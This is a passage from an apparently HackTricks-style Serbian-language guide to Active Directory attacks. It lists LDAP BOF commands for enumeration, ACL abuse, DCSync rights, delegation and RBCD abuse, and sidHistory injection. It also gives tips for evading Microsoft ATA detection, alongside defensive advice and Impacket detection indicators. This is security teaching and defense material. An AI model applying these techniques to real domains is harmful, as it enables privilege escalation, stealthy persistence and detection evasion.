- `get-acl` i `get-writable --detailed` parsiraju DACL i izlistavaju trustees, prava (GenericAll/WriteDACL/WriteOwner/upis atributa) i nasleđivanje, čime odmah daju ciljeve za eskalaciju privilegija preko ACL-a.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### LDAP primitive za upis za eskalaciju i perzistenciju

- BOF-ovi za kreiranje objekata (`add-user`, `add-computer`, `add-group`, `add-ou`) omogućavaju operatoru da pripremi nove principale ili mašinske naloge u bilo kojoj OU za koju postoje prava. `add-groupmember`, `set-password`, `add-attribute` i `set-attribute` direktno preuzimaju kontrolu nad ciljevima čim se pronađu prava za upisivanje svojstava.
- Komande usmerene na ACL, kao što su `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` i `add-dcsync`, pretvaraju WriteDACL/WriteOwner nad bilo kojim AD objektom u resetovanje lozinki, kontrolu članstva u grupama ili privilegije za DCSync replikaciju, bez ostavljanja PowerShell/ADSI tragova. Odgovarajuće komande `remove-*` uklanjaju ubačene ACE-ove.

### Delegiranje, roasting i zloupotreba Kerberos-a

- `add-spn`/`set-spn` odmah omogućavaju da se kompromitovani korisnik napadne Kerberoasting-om; `add-asreproastable` (promena UAC-a) označava ga za AS-REP roasting bez promene lozinke.
- Makroi za delegiranje (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) menjaju `msDS-AllowedToDelegateTo`, UAC zastavice ili `msDS-AllowedToActOnBehalfOfOtherIdentity` direktno iz beacona, čime omogućavaju putanje napada sa ograničenim/neograničenim delegiranjem/RBCD i uklanjaju potrebu za udaljenim PowerShell-om ili RSAT-om.

### Ubacivanje sidHistory, premeštanje OU-a i oblikovanje površine napada

- `add-sidhistory` ubacuje privilegovane SID-ove u SID istoriju kontrolisanog principala (pogledajte [SID-History Injection](sid-history-injection.md)), omogućavajući neupadljivo nasleđivanje pristupa u potpunosti preko LDAP/LDAPS-a.
- `move-object` menja DN/OU računara ili korisnika, što napadaču omogućava da premesti sredstva pod delegirana prava pre upotrebe `set-password`, `add-groupmember` ili `add-spn`. Pogledajte [OU relocation and inherited rights](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions) za prava premeštanja i provere nasleđivanja.
- Pažljivo ograničene komande za uklanjanje (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` itd.) omogućavaju brzo vraćanje promena nakon što operator prikupi akreditive ili uspostavi perzistenciju, uz minimalnu telemetriju.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Neke opšte odbrane

[**Saznajte više o zaštiti akreditiva ovde.**](../stealing-credentials/credentials-protections.md)

### **Odbrambene mere za zaštitu akreditiva**

- **Ograničenja za Domain Admins**: Preporučuje se da Domain Admins mogu da se prijavljuju samo na Domain Controllers, a ne i na druge hostove.
- **Privilegije servisnih naloga**: Servisi ne bi trebalo da se pokreću sa privilegijama Domain Admin (DA), kako bi se očuvala bezbednost.
- **Vremensko ograničavanje privilegija**: Trajanje zadataka koji zahtevaju DA privilegije trebalo bi ograničiti. To se može postići ovako: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Ublažavanje LDAP relay napada**: Revidirajte Event ID-jeve 2889/3074/3075, a zatim nametnite LDAP signing i LDAPS channel binding na DC-ovima/klijentima da biste blokirali LDAP MITM/relay pokušaje.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Otkrivanje Impacket aktivnosti na nivou protokola

Ako želite da otkrijete uobičajene AD taktike, **nemojte se oslanjati samo na tragove kojima operator može da upravlja**, kao što su preimenovane binarne datoteke, nazivi servisa, privremene batch datoteke ili putanje izlaznih datoteka. Napravite osnovni profil načina na koji legitimni Windows klijenti generišu [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC i WMI saobraćaj, a zatim tražite **specifičnosti implementacije** koje ostaju i nakon što operator izmeni `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ili `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Samostalni indikatori visoke pouzdanosti** (nakon provere u odnosu na sopstveni osnovni profil):
  - Autentifikovani DCE/RPC sa `auth_context_id = 79231 + ctx_id`
  - DCE/RPC autentifikaciono dopunjavanje popunjeno vrednostima `0xff`
  - LDAP Kerberos bind-ovi koji direktno smeštaju sirovi Kerberos `AP-REQ` u SPNEGO `mechToken`
  - SMB2/3 negotiate zahtevi sa vrednostima `ClientGuid` koje izgledaju kao ASCII tekst
  - WMI `IWbemLevel1Login::NTLMLogin` koji koristi nestandardni namespace `//./root/cimv2`
  - Fiksno zadate Kerberos nonce vrednosti
- **Bolje ih je koristiti kao funkcije za korelaciju i ocenjivanje**:
  - Retke ili duplirane Kerberos etype liste, neuobičajeni/nedostajući `PA-DATA` ili redosled etype vrednosti u TGS-REQ-u koji se razlikuje od izvornog Windows-a
  - NTLM Type 1 poruke bez informacija o verziji ili Type 3 poruke sa null nazivima hostova
  - Sirovi NTLMSSP prenet preko DCE/RPC umesto SPNEGO, nedostajući DCE/RPC verification trailers ili nepodudaranja SPNEGO/Kerberos OID-ova
  - Nekoliko ovih karakteristika sa istog hosta/korisnika/sesije/vremenskog prozora mnogo su snažniji indikatori od bilo kog pojedinačnog slabog polja
- **Koristite ih za dodatni kontekst, a ne kao samostalna upozorenja**:
  - Podrazumevana imena datoteka, putanje izlaznih datoteka, nasumična imena servisa, privremena imena batch datoteka, podrazumevana imena računarskih naloga i HTTP/WebDAV/RDP/MSSQL stringovi specifični za alat
  - Operatori ih lako menjaju, pa ih je najbolje koristiti za objašnjenje zašto je klaster više protokola sumnjiv
- **Operativne napomene**:
  - Neki od ovih signala zahtevaju dešifrovan saobraćaj, [PCAP/Zeek analizu](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ili uvid sa strane servisa
  - Proverite ih u odnosu na Samba/Linux klijente, uređaje i zastareo softver pre nego što ih pretvorite u upozorenja
  - Kako stičete poverenje u osnovni profil, unapređujte detekcije od dodatnog konteksta -> lova na pretnje -> upozoravanja

### **Primena tehnika obmane**

- Primena obmane podrazumeva postavljanje zamki, kao što su lažni korisnici ili računari sa karakteristikama poput lozinki koje ne ističu ili oznake Trusted for Delegation. Detaljan pristup obuhvata kreiranje korisnika sa određenim pravima ili njihovo dodavanje u grupe sa visokim privilegijama.<sup>[[2]](#references)</sup>
- Praktičan primer je korišćenje alata kao što je: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Više informacija o primeni tehnika obmane možete pronaći na stranici [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Prepoznavanje obmane**

- **Za korisničke objekte**: Sumnjivi indikatori obuhvataju neuobičajen ObjectSID, retke prijave, datume kreiranja i mali broj neuspešnih unosa lozinke.
- **Opšti indikatori**: Poređenje atributa potencijalnih lažnih objekata sa atributima stvarnih objekata može otkriti nedoslednosti. Alati poput [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogu pomoći u prepoznavanju takve obmane.

### **Zaobilaženje sistema za detekciju**

- **Zaobilaženje Microsoft ATA detekcije**:
  - **Enumeracija korisnika**: Izbegavajte enumeraciju sesija na Domain Controller-ima kako biste sprečili ATA detekciju.
  - **Impersonacija tiketa**: Korišćenje **aes** ključeva za kreiranje tiketa pomaže u izbegavanju detekcije jer ne dolazi do snižavanja na NTLM.
  - **DCSync napadi**: Preporučuje se izvršavanje sa sistema koji nije Domain Controller, kako bi se izbegla ATA detekcija, jer će direktno izvršavanje sa Domain Controller-a pokrenuti upozorenja.

## References

- [1] [Vodič za napad na poverenja domena](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Falsifikovanje poverenja radi obmane u Active Directory-ju](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Od Domain Admin-a do Enterprise Admin-a](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF kolekcija – LDAP alatka u memoriji za eksploataciju Active Directory-ja](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Pretvaranje NTLM hash-eva u wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirati](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Analiza Impacket-a](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Preuzimanje Active Directory naloga preko Netlogon-a](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Kako upravljati promenama u Netlogon vezama bezbednog kanala povezanim sa CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Putovanje kroz zaboravljene Null Session i MS-RPC interfejse](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter kao bezbednosna granica između domena? (4. deo) - Istraživanje zaobilaženja SID filtriranja](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter kao bezbednosna granica između domena? (5. deo) - Golden GMSA napad na poverenje - od podređenog do nadređenog domena](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter kao bezbednosna granica između domena? (6. deo) - Napad na poverenje promenom šeme - od podređenog do nadređenog domena](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Od DA do EA uz ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Eskalacija od administratora podređenog domena do enterprise administratora za 5 minuta zloupotrebom AD CS-a, nastavak](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [ACE u rukavu: dizajniranje Active Directory DACL backdoor-a](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Izvorni kod NetExec pre2k modula](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - atribut msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
